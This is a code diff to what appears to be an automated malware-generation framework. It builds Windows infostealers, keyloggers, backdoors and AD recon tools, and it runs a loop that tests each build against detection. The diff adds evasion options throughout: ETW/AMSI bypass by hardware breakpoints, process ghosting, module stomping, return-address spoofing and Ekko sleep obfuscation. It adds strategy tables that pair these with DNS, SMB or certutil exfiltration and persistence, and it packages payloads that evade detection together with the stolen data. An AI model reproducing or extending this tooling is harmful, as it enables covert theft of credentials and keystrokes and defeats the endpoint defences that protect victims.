@@ -30,6 +30,7 @@ LAYERS = {
             "loadlibrary":      {"risk": "medium", "desc": "LoadLibrary+GetProcAddress at runtime"},
             "api_hash_djb2":    {"risk": "low",    "desc": "DJB2 hash resolution, no string refs in binary"},
             "api_hash_crc32":   {"risk": "low",    "desc": "CRC32 hash resolution variant"},
+            "api_hash_fnv1a":   {"risk": "low",    "desc": "FNV-1a hash resolution — different constants from DJB2/CRC32"},
             "peb_walk":         {"risk": "vlow",   "desc": "Manual PEB walking, no LoadLibrary in IAT"},
             "indirect_syscall": {"risk": "vlow",   "desc": "Direct syscalls bypassing usermode hooks"},
         },
@@ -63,6 +64,7 @@ LAYERS = {
             "ppid_spoof_dllhost":      {"risk": "vlow", "desc": "Spoofed parent (dllhost.exe — COM surrogate)"},
             "dll_sideload":   {"risk": "vlow",   "desc": "Proxy DLL loaded by signed MS binary"},
             "process_hollow": {"risk": "vlow",   "desc": "Hollowed legitimate process"},
+            "process_ghost":  {"risk": "vlow",   "desc": "Ghost process — file deleted before EDR can scan"},
         },
         "default": "standalone",
     },
@@ -97,6 +99,42 @@ LAYERS = {
             "full":         {"risk": "vlow",   "desc": "All anti-analysis combined"},
         },
         "default": "none",
+    },
+    "etw_method": {
+        "description": "ETW/AMSI bypass method",
+        "options": {
+            "patch":        {"risk": "medium", "desc": "Memory-patch EtwEventWrite — fast but detectable by integrity scan"},
+            "hwbp_etw":     {"risk": "vlow",   "desc": "Hardware breakpoint on EtwEventWrite — patchless, defeats integrity checks"},
+            "hwbp_both":    {"risk": "vlow",   "desc": "Hardware breakpoint on both EtwEventWrite + AmsiScanBuffer — full patchless"},
+            "none":         {"risk": "high",   "desc": "No ETW/AMSI bypass"},
+        },
+        "default": "patch",
+    },
+    "memory_residence": {
+        "description": "Where executable code lives in memory",
+        "options": {
+            "native":       {"risk": "low",    "desc": "Run from EXE's own .text — image-backed by default"},
+            "module_stomp": {"risk": "vlow",   "desc": "Overwrite signed DLL .text — looks image-backed to VAD scanner"},
+        },
+        "default": "native",
+    },
+    "stack_presentation": {
+        "description": "How return addresses appear on the call stack",
+        "options": {
+            "honest":       {"risk": "medium", "desc": "Real return addresses — points into our code"},
+            "ret_spoof":    {"risk": "vlow",   "desc": "Spoofed return addresses — points into legitimate DLLs"},
+        },
+        "default": "honest",
+    },
+    "sleep_mode": {
+        "description": "How persistent payloads protect memory during idle",
+        "options": {
+            "basic":        {"risk": "high",   "desc": "Plain Sleep() — memory scannable during idle"},
+            "jitter":       {"risk": "medium", "desc": "Randomized sleep intervals — timing analysis resistant"},
+            "encrypt":      {"risk": "low",    "desc": "XOR-encrypt buffers during sleep"},
+            "ekko":         {"risk": "vlow",   "desc": "Ekko-style ROP — encrypt entire region + PAGE_NOACCESS during sleep"},
+        },
+        "default": "basic",
     },
     "exfil": {
         "description": "Data exfiltration method",
@@ -408,21 +446,214 @@ def select_layers(detection_text="", compile_error="", previous_config=None, run
                     config[layer] = pref
                     break
 
-    # Without feedback, progressively escalate evasion each run
+    # Without feedback, use strategy archetypes — each run is a fundamentally
+    # different evasion strategy, not an incremental tweak of the previous one.
+    # Ranked by historical success probability per malware type.
     if not detection_text and not compile_error and run_index > 0:
-        escalation = [
-            {"data_obfuscation": "xor_encrypt", "anti_analysis": "anti_debug"},
-            {"api_resolve": "api_hash_djb2", "timing": "staged_jitter"},
-            {"execution": "callback_abuse", "exfil": "http_post"},
-            {"process": "ppid_spoof", "persistence": "registry_run", "anti_analysis": "anti_vm"},
-        ]
-        for step in escalation[:min(run_index, len(escalation))]:
-            for layer, opt in step.items():
-                if layer in LAYERS and opt in LAYERS[layer]["options"]:
-                    if opt not in avoid_map.get(layer, set()):
-                        config[layer] = opt
+        malware_type = (previous_config or {}).get("_malware_type", "infostealer")
+        strategies = STRATEGY_ARCHETYPES.get(malware_type, STRATEGY_ARCHETYPES["infostealer"])
+        idx = min(run_index - 1, len(strategies) - 1)
+        strategy = strategies[idx]
+        for layer, opt in strategy.items():
+            if layer in LAYERS and opt in LAYERS[layer]["options"]:
+                if opt not in avoid_map.get(layer, set()):
+                    config[layer] = opt
 
     return config
+
+
+# Strategy archetypes — each is a fundamentally different evasion approach.
+# Ordered by success probability per type. Maximum behavioral variance between entries.
+STRATEGY_ARCHETYPES = {
+    "infostealer": [
+        # S1: "Ghost" — minimal footprint, DNS drip-feed, behavioral pacing
+        {
+            "api_resolve": "api_hash_fnv1a", "execution": "callback_certenumsystem",
+            "process": "ppid_spoof_sihost", "timing": "staged_jitter",
+            "data_obfuscation": "stack_strings", "anti_analysis": "none",
+            "exfil": "dns_txt", "persistence": "none",
+            "etw_method": "hwbp_both", "stack_presentation": "ret_spoof",
+            "memory_residence": "native", "sleep_mode": "basic",
+        },
+        # S2: "Service Mimic" — looks like a Windows service doing HTTP health checks
+        {
+            "api_resolve": "peb_walk", "execution": "callback_abuse",
+            "process": "ppid_spoof_svchost", "timing": "deferred",
+            "data_obfuscation": "aes_encrypt", "anti_analysis": "anti_sandbox",
+            "exfil": "winhttp_api", "persistence": "none",
+            "etw_method": "patch", "stack_presentation": "honest",
+            "memory_residence": "native", "sleep_mode": "basic",
+        },
+        # S3: "File Share Blend" — writes to SMB shares, ghost process evades file scan
+        {
+            "api_resolve": "indirect_syscall", "execution": "fiber",
+            "process": "process_ghost", "timing": "triggered",
+            "data_obfuscation": "xor_encrypt", "anti_analysis": "anti_debug",
+            "exfil": "smb_write", "persistence": "none",
+            "etw_method": "hwbp_etw", "stack_presentation": "ret_spoof",
+            "memory_residence": "module_stomp", "sleep_mode": "basic",
+        },
+        # S4: "Update Check" — looks like software polling for updates
+        {
+            "api_resolve": "api_hash_djb2", "execution": "staged",
+            "process": "ppid_spoof_runtimebroker", "timing": "workday",
+            "data_obfuscation": "aes_encrypt", "anti_analysis": "none",
+            "exfil": "https_post", "persistence": "none",
+            "etw_method": "hwbp_both", "stack_presentation": "honest",
+            "memory_residence": "native", "sleep_mode": "basic",
+        },
+        # S5: "LOLBin Chain" — all native tools, no custom network code
+        {
+            "api_resolve": "api_hash_crc32", "execution": "callback_copyfile2",
+            "process": "ppid_spoof_taskhostw", "timing": "deferred",
+            "data_obfuscation": "stack_strings", "anti_analysis": "anti_sandbox",
+            "exfil": "certutil_lolbin", "persistence": "none",
+            "etw_method": "patch", "stack_presentation": "ret_spoof",
+            "memory_residence": "native", "sleep_mode": "basic",
+        },
+    ],
+    "keylogger": [
+        # S1: "Low-and-Slow" — DNS drip-feed, callback execution, patchless ETW
+        {
+            "api_resolve": "api_hash_fnv1a", "execution": "callback_enumwindows",
+            "process": "ppid_spoof_sihost", "timing": "staged_jitter",
+            "data_obfuscation": "stack_strings", "anti_analysis": "none",
+            "exfil": "dns_txt", "persistence": "registry_run",
+            "etw_method": "hwbp_both", "stack_presentation": "ret_spoof",
+            "memory_residence": "native", "sleep_mode": "ekko",
+        },
+        # S2: "Service Background" — looks like svchost child doing periodic HTTP
+        {
+            "api_resolve": "peb_walk", "execution": "callback_abuse",
+            "process": "ppid_spoof_svchost", "timing": "workday",
+            "data_obfuscation": "aes_encrypt", "anti_analysis": "anti_sandbox",
+            "exfil": "winhttp_api", "persistence": "scheduled_task",
+            "etw_method": "patch", "stack_presentation": "honest",
+            "memory_residence": "native", "sleep_mode": "encrypt",
+        },
+        # S3: "Desktop Blend" — RuntimeBroker child, HTTPS, sleep encrypt
+        {
+            "api_resolve": "api_hash_djb2", "execution": "callback_certenumsystem",
+            "process": "ppid_spoof_runtimebroker", "timing": "triggered",
+            "data_obfuscation": "xor_encrypt", "anti_analysis": "anti_debug",
+            "exfil": "https_post", "persistence": "startup_folder",
+            "etw_method": "hwbp_etw", "stack_presentation": "ret_spoof",
+            "memory_residence": "module_stomp", "sleep_mode": "jitter",
+        },
+        # S4: "Stealth Net" — ghost process, SMB writes, full patchless
+        {
+            "api_resolve": "indirect_syscall", "execution": "fiber",
+            "process": "process_ghost", "timing": "deferred",
+            "data_obfuscation": "aes_encrypt", "anti_analysis": "none",
+            "exfil": "smb_write", "persistence": "registry_run",
+            "etw_method": "hwbp_both", "stack_presentation": "ret_spoof",
+            "memory_residence": "native", "sleep_mode": "ekko",
+        },
+        # S5: "Named Pipe Local" — no network, pipe to co-resident process
+        {
+            "api_resolve": "api_hash_crc32", "execution": "apc_self",
+            "process": "ppid_spoof_taskhostw", "timing": "staged_jitter",
+            "data_obfuscation": "stack_strings", "anti_analysis": "anti_sandbox",
+            "exfil": "named_pipe", "persistence": "scheduled_task",
+            "etw_method": "patch", "stack_presentation": "honest",
+            "memory_residence": "native", "sleep_mode": "encrypt",
+        },
+    ],
+    "backdoor": [
+        # S1: "HTTP Beacon" — WinHTTP C2, callback exec, Ekko sleep
+        {
+            "api_resolve": "api_hash_fnv1a", "execution": "callback_abuse",
+            "process": "ppid_spoof_svchost", "timing": "staged_jitter",
+            "data_obfuscation": "aes_encrypt", "anti_analysis": "anti_sandbox",
+            "exfil": "winhttp_api", "persistence": "registry_run",
+            "etw_method": "hwbp_both", "stack_presentation": "ret_spoof",
+            "memory_residence": "native", "sleep_mode": "ekko",
+        },
+        # S2: "DNS C2" — DNS-based C2, dllhost parent, patchless
+        {
+            "api_resolve": "peb_walk", "execution": "callback_certenumsystem",
+            "process": "ppid_spoof_dllhost", "timing": "workday",
+            "data_obfuscation": "stack_strings", "anti_analysis": "none",
+            "exfil": "dns_txt", "persistence": "scheduled_task",
+            "etw_method": "hwbp_etw", "stack_presentation": "ret_spoof",
+            "memory_residence": "module_stomp", "sleep_mode": "encrypt",
+        },
+        # S3: "HTTPS Stealth" — ghost process, app doing TLS, indirect syscalls
+        {
+            "api_resolve": "indirect_syscall", "execution": "fiber",
+            "process": "process_ghost", "timing": "triggered",
+            "data_obfuscation": "aes_encrypt", "anti_analysis": "anti_debug",
+            "exfil": "https_post", "persistence": "startup_folder",
+            "etw_method": "hwbp_both", "stack_presentation": "honest",
+            "memory_residence": "native", "sleep_mode": "ekko",
+        },
+        # S4: "SMB C2" — file share based C2, minimal network footprint
+        {
+            "api_resolve": "api_hash_djb2", "execution": "callback_enumwindows",
+            "process": "ppid_spoof_sihost", "timing": "deferred",
+            "data_obfuscation": "xor_encrypt", "anti_analysis": "anti_sandbox",
+            "exfil": "smb_write", "persistence": "registry_run",
+            "etw_method": "patch", "stack_presentation": "ret_spoof",
+            "memory_residence": "native", "sleep_mode": "jitter",
+        },
+        # S5: "TCP Raw" — raw TCP, fast and simple, all evasion in other layers
+        {
+            "api_resolve": "api_hash_crc32", "execution": "staged",
+            "process": "ppid_spoof_taskhostw", "timing": "staged_jitter",
+            "data_obfuscation": "stack_strings", "anti_analysis": "none",
+            "exfil": "tcp_direct", "persistence": "scheduled_task",
+            "etw_method": "hwbp_both", "stack_presentation": "ret_spoof",
+            "memory_residence": "module_stomp", "sleep_mode": "ekko",
+        },
+    ],
+    "ad_recon": [
+        # S1: "LDAP Ghost" — DNS exfil, patchless, looks like AD query tool
+        {
+            "api_resolve": "api_hash_fnv1a", "execution": "callback_abuse",
+            "process": "ppid_spoof_svchost", "timing": "staged_jitter",
+            "data_obfuscation": "stack_strings", "anti_analysis": "none",
+            "exfil": "dns_txt", "persistence": "none",
+            "etw_method": "hwbp_both", "stack_presentation": "ret_spoof",
+            "memory_residence": "native", "sleep_mode": "basic",
+        },
+        # S2: "IT Admin Tool" — SMB, workday timing, looks like management script
+        {
+            "api_resolve": "peb_walk", "execution": "staged",
+            "process": "ppid_spoof_dllhost", "timing": "workday",
+            "data_obfuscation": "aes_encrypt", "anti_analysis": "anti_sandbox",
+            "exfil": "smb_write", "persistence": "none",
+            "etw_method": "patch", "stack_presentation": "honest",
+            "memory_residence": "native", "sleep_mode": "basic",
+        },
+        # S3: "HTTPS Report" — exfils via HTTPS, deferred start
+        {
+            "api_resolve": "api_hash_djb2", "execution": "callback_certenumsystem",
+            "process": "ppid_spoof_runtimebroker", "timing": "deferred",
+            "data_obfuscation": "xor_encrypt", "anti_analysis": "anti_debug",
+            "exfil": "https_post", "persistence": "none",
+            "etw_method": "hwbp_etw", "stack_presentation": "ret_spoof",
+            "memory_residence": "native", "sleep_mode": "basic",
+        },
+        # S4: "WinHTTP Blend" — ghost process, looks like update check
+        {
+            "api_resolve": "indirect_syscall", "execution": "fiber",
+            "process": "process_ghost", "timing": "triggered",
+            "data_obfuscation": "aes_encrypt", "anti_analysis": "none",
+            "exfil": "winhttp_api", "persistence": "none",
+            "etw_method": "hwbp_both", "stack_presentation": "honest",
+            "memory_residence": "module_stomp", "sleep_mode": "basic",
+        },
+        # S5: "HTTP Sprint" — fast HTTP exfil, CRC32, callback
+        {
+            "api_resolve": "api_hash_crc32", "execution": "callback_copyfile2",
+            "process": "ppid_spoof_taskhostw", "timing": "staged_jitter",
+            "data_obfuscation": "stack_strings", "anti_analysis": "anti_sandbox",
+            "exfil": "http_post", "persistence": "none",
+            "etw_method": "patch", "stack_presentation": "ret_spoof",
+            "memory_residence": "native", "sleep_mode": "basic",
+        },
+    ],
+}
 
 
 def record_run(config, detected, detection_text="", success=False):
@@ -556,6 +787,7 @@ def config_to_recipe(config, malware_type="infostealer", collectors=None):
     api_resolve_map = {
         "api_hash_djb2":    "api_resolve/api_hash_djb2",
         "api_hash_crc32":   "api_resolve/api_hash_djb2",
+        "api_hash_fnv1a":   "api_resolve/api_hash_fnv1a",
         "peb_walk":         "api_resolve/peb_walk",
         "indirect_syscall": "evasion/indirect_syscall",
     }
@@ -570,6 +802,7 @@ def config_to_recipe(config, malware_type="infostealer", collectors=None):
         "ppid_spoof_dllhost":      "process/ppid_spoof_dllhost",
         "dll_sideload":   "process/ppid_spoof",
         "process_hollow": "process/ppid_spoof",
+        "process_ghost":  "process/process_ghost",
     }
 
     if is_ad_recon:
@@ -640,8 +873,35 @@ def config_to_recipe(config, malware_type="infostealer", collectors=None):
         if (CHUNKS_DIR / f"{chunk_path}.c").exists():
             lines.append(f"process: {chunk_path}")
 
+    # ETW/AMSI bypass method
+    etw = config.get("etw_method", "patch")
+    if etw == "patch":
+        evasion_chunks.append("evasion/etw_patch")
+    elif etw == "hwbp_etw":
+        evasion_chunks.append("evasion/hw_bp_etw")
+    elif etw == "hwbp_both":
+        evasion_chunks.append("evasion/hw_bp_etw")
+        evasion_chunks.append("evasion/amsi_hwbp")
+
+    # Memory residence
+    if config.get("memory_residence") == "module_stomp":
+        evasion_chunks.append("evasion/module_stomp")
+
+    # Stack presentation
+    if config.get("stack_presentation") == "ret_spoof":
+        evasion_chunks.append("evasion/ret_spoof")
+
+    # Sleep mode (for persistent payloads)
+    sleep = config.get("sleep_mode", "basic")
+    if sleep == "jitter":
+        evasion_chunks.append("evasion/sleep_jitter")
+    elif sleep == "encrypt":
+        evasion_chunks.append("evasion/sleep_encrypt")
+    elif sleep == "ekko":
+        evasion_chunks.append("evasion/sleep_ekko")
+
     # Add proven evasion chunks that always help
-    always_safe = ["evasion/etw_patch", "evasion/header_stomp", "evasion/behavioral_pacing"]
+    always_safe = ["evasion/header_stomp", "evasion/behavioral_pacing"]
     for chunk in always_safe:
         if chunk not in evasion_chunks and (CHUNKS_DIR / f"{chunk}.c").exists():
             evasion_chunks.append(chunk)
@@ -1015,6 +1275,7 @@ def run_hybrid_loop(
         print("  [1/5] Assembling...", end="", flush=True)
         recipe_content = config_to_recipe(config, malware_type)
         recipe_path = tempfile.mktemp(suffix=".yaml")
+        recipe_text = recipe_content  # keep for packaging
         with open(recipe_path, "w") as f:
             f.write(recipe_content)
         src_path = tempfile.mktemp(suffix=".c")
@@ -1049,6 +1310,7 @@ def run_hybrid_loop(
         else:
             print("  [2/5] Obfuscation: off", flush=True)
 
+        obfuscated_source = src  # keep for packaging
         with open(src_path, "w") as f:
             f.write(src)
 
@@ -1059,7 +1321,7 @@ def run_hybrid_loop(
             ["x86_64-w64-mingw32-gcc", "-mwindows", "-o", exe_path, src_path,
              "-lws2_32", "-liphlpapi", "-lcrypt32", "-lole32", "-lshell32", "-lgdi32",
              "-lwininet", "-lwinhttp", "-ldnsapi", "-ladvapi32", "-luser32",
-             "-lwldap32", "-lnetapi32",
+             "-lwldap32", "-lnetapi32", "-lmpr",
              "-static", "-s", "-Wl,--strip-all"],
             capture_output=True, text=True)
         os.unlink(src_path)
@@ -1148,8 +1410,6 @@ def run_hybrid_loop(
         if malware_type in ("keylogger", "infostealer"):
             subprocess.run(f"{ssh} 'schtasks /delete /tn evasion_test /f'",
                            shell=True, capture_output=True)
-        os.unlink(exe_path)
-
         c2_size = os.path.getsize(c2_out) if os.path.exists(c2_out) else 0
         time.sleep(5)
         # VM cleanup
@@ -1164,8 +1424,34 @@ def run_hybrid_loop(
         if c2_size > c2_threshold and not wazuh_det and not sigma_det:
             print(f" SUCCESS ({c2_size:,} bytes)", flush=True)
             record_run(config, detected=False, success=True)
+            # ── Package results ──
+            import shutil
+            ts = time.strftime("%Y%m%d_%H%M%S")
+            results_root = Path(__file__).parent.parent.parent / "results"
+            pkg_dir = results_root / f"chunk_{malware_type}_{ts}"
+            pkg_dir.mkdir(parents=True, exist_ok=True)
+            (pkg_dir / "source.c").write_text(obfuscated_source)
+            (pkg_dir / "recipe.yaml").write_text(recipe_text)
+            if os.path.exists(exe_path):
+                shutil.copy2(exe_path, str(pkg_dir / "payload.exe"))
+            if os.path.exists(c2_out) and c2_size > 0:
+                shutil.copy2(c2_out, str(pkg_dir / f"exfil_{ts}.bin"))
+            (pkg_dir / "build_info.txt").write_text(
+                f"type: {malware_type}\n"
+                f"run: {run_num}/{max_total}\n"
+                f"c2_bytes: {c2_size}\n"
+                f"binary_size: {exe_size}\n"
+                f"obfuscation: {obf_level}\n"
+                f"config: {config}\n"
+            )
+            latest = results_root / "latest"
+            latest.unlink(missing_ok=True)
+            latest.symlink_to(pkg_dir.name)
+            print(f"  Package: {pkg_dir}/", flush=True)
             if os.path.exists(c2_out):
                 os.unlink(c2_out)
+            if os.path.exists(exe_path):
+                os.unlink(exe_path)
             results_log.append("S")
             # ── Final success summary ──
             print(f"\n{'='*60}", flush=True)
@@ -1200,6 +1486,8 @@ def run_hybrid_loop(
             record_run(config, detected=detected, detection_text=det_text or "no_c2_data", success=False)
             if os.path.exists(c2_out):
                 os.unlink(c2_out)
+            if os.path.exists(exe_path):
+                os.unlink(exe_path)
             history = load_history()
 
     # ── Final failure summary ──
